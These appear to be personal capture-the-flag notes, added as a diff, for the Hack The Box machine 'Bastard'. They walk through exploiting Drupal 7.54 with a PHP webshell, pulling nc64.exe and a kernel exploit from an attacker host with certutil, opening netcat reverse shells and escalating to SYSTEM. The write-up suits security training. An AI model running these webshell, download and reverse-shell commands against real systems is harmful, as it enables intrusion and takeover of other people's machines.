@@ -1,0 +1,41 @@
+Bastard
+- *nmap -T4 -Pn 10.10.10.9*
+	- port 80 - http
+	- port 135 - rpc
+	- port 49154
+- browser: 10.10.10.9
+	- Wappalyzer reveals Drupal is the CMS
+- further, navigating to 10.10.10.9/CHANGELOG.txt reveals exact Drupal version 7.54
+- google: Drupal 7.54 exploit
+	- https://www.exploit-db.com/exploits/41564
+- dirsearch reveals "/rest" as a live endpoint
+- requires us to change the following before running:
+	- $url = 'http://vmweb.lan/drupal-7.54'; ***--->*** 'http://10.10.10.9';
+	- $endpoint_path = '/rest_endpoint'; ***--->*** '/rest';
+	- $file = [
+		    'filename' => 'cmd.php',
+		    'data' => '<?php system($_REQUEST["cmd"]); ?>'
+];
+- *sudo apt install php-curl*
+- *php 41564.php*
+	- provides us with the admin session cookie, and the admin hash - too difficult to crack
+	- provides us with a webshell: "File written: http://10.10.10.9/cmd.php"
+- netcat is not already on the system, so:
+- *python -m http.server 8081*
+- *curl http://10.10.10.9/cmd.php?cmd=certutil.exe%20-urlcache%20-f%20http://10.10.14.7:8081/nc64.exe%20nc64.exe*
+- *rlwrap nc -nlvp 7777*
+- *curl http://10.10.10.9/cmd.php?cmd=nc64.exe%20-e%20cmd.exe%2010.10.14.7%207777*
+- *whoami*
+	- iusr
+- *systeminfo* <-- check for hotfixes installed
+- no hotfixes? points to kernel exploit
+- https://github.com/51x/WHP
+- somehow they were able to get windows-exploit-suggester.py or .exe running (system didn't have python and exe's weren't doing anything - winpeas included)
+	- yet allegedly they will report MS11-011 or MS10-059 as avenues for escalation
+	- https://github.com/SecWiki/windows-kernel-exploits/tree/master
+	- specifically using Chimichurri.exe
+- *curl http://10.10.10.9/cmd.php?cmd=certutil.exe%20-urlcache%20-f%20http://10.10.14.7:8081/Chimichurri.exe%20chimi.exe*
+- *rlwrap nc -nlvp 4446*
+- *chimi.exe 10.10.14.7 4446*
+- *whoami*
+	- nt authority\system
